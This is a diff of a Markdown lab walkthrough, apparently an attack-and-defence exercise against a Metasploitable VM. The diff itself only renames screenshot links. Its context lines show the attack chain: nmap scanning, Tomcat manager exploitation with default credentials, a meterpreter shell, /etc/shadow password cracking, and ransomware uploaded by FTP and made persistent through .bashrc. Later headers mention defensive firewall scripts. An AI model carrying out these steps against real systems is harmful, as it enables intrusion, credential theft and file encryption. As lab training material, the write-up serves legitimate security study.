@@ -36,8 +36,6 @@ sudo ./hackthenetwork.sh
 
 ![ICMP network scan results](screenshots/image.png)
 
-![image.png](image.png)
-
 ### Port Scanning :
 
 ```bash
@@ -46,26 +44,27 @@ sudo nmap -sS -sV -O 192.168.80.148
 
 ### Output :-
 
-screenshots/image.png
-![image.png](image%202.png)
+![Nmap Result](screenshots/image1.png)
+
+![Service Check](screenshots/image2.png)
 
 ```bash
 sudo msfconsole
 ```
 
-![image.png](image%203.png)
+![Metasploit Framework](screenshots/image3.png)
 
 ```bash
 search apache tomcat
 ```
 
-![image.png](image%204.png)
+![Searching For Payloads](screenshots/image4.png)
 
 ```bash
 use exploit/multi/http/tomcat_mgr_deploy
 ```
 
-![image.png](image%205.png)
+![mgr_deploy Payload Selection](screenshots/image5.png)
 
 ```bash
 set rhosts 192.168.80.148
@@ -76,7 +75,7 @@ set HttpUsername tomcat
 
 The Default Username and Passwords for tomcat :
 
-![image.png](image%206.png)
+![Default Credentials To Exploit Misconfiguration Vulnerability](screenshots/image6.png)
 
 ```bash
 exploit
@@ -84,7 +83,7 @@ exploit
 
 — we have got a meterpreter session 
 
-![image.png](image%207.png)
+![Got Meterpreter Session](screenshots/image7.png)
 
 but got tomcat user session now we want to do previllege escalation
 
@@ -96,7 +95,7 @@ meterpreter> shell
 whoami
 ```
 
-![image.png](image%208.png)
+![previllege escalation](screenshots/image8.png)
 
 Got the root access :
 
@@ -111,7 +110,7 @@ unshadow /etc/passwd /etc/shadow > hashes.txt
 john hashes.txt
 ```
 
-![image.png](image%209.png)
+![Password Cracking](screenshots/image9.png)
 
 ### Ransomeware Script :
 
@@ -281,7 +280,7 @@ put handsomeware.sh
 put handsomeBanner.sh 
 ```
 
-![image.png](image%2010.png)
+![FTP to send Ransomware](screenshots/image10.png)
 
 ### Now in Our MSFCONSOLE SESSION
 
@@ -295,13 +294,13 @@ touch .bashrc
 echo "/home/msfadmin/handsomeware.sh" >> /home/msfadmin/.bashrc
 ```
 
-![image.png](image%2011.png)
+![Give Permissions And RUN a Script to Change the Login Page](screenshots/image11.png)
 
 ## Now When the User Reboots the Victim Machine
 
-![image.png](image%2012.png)
+![Victim Machine](screenshots/image12.png)
 
-![image.png](image%2013.png)
+![Files Are Encrypted](screenshots/image13.png)
 
 ### Ransomeware attack successfull!!!!
 
@@ -479,9 +478,9 @@ sudo /etc/init.d/audit-ransomware-guard start
 
 ## After the Ransomeware attack putty stoped working and the machine is isolated from the internet successfully!!
 
-![image.png](image%2014.png)
+![Putty Stopped working](screenshots/image14.png)
 
-![image.png](image%2015.png)
+![All Packets Are Dropped](screenshots/image15.png)
 
 ### Additional Steps to SafeGuard Your Victim Machine :
 
@@ -791,4 +790,4 @@ sudo chmod +x fw_metasploitable_protect.sh
 sudo ./fw_metasploitable_protect.sh
 ```
 
-![image.png](image%2016.png)
+![Final Architecture](screenshots/image16.png)
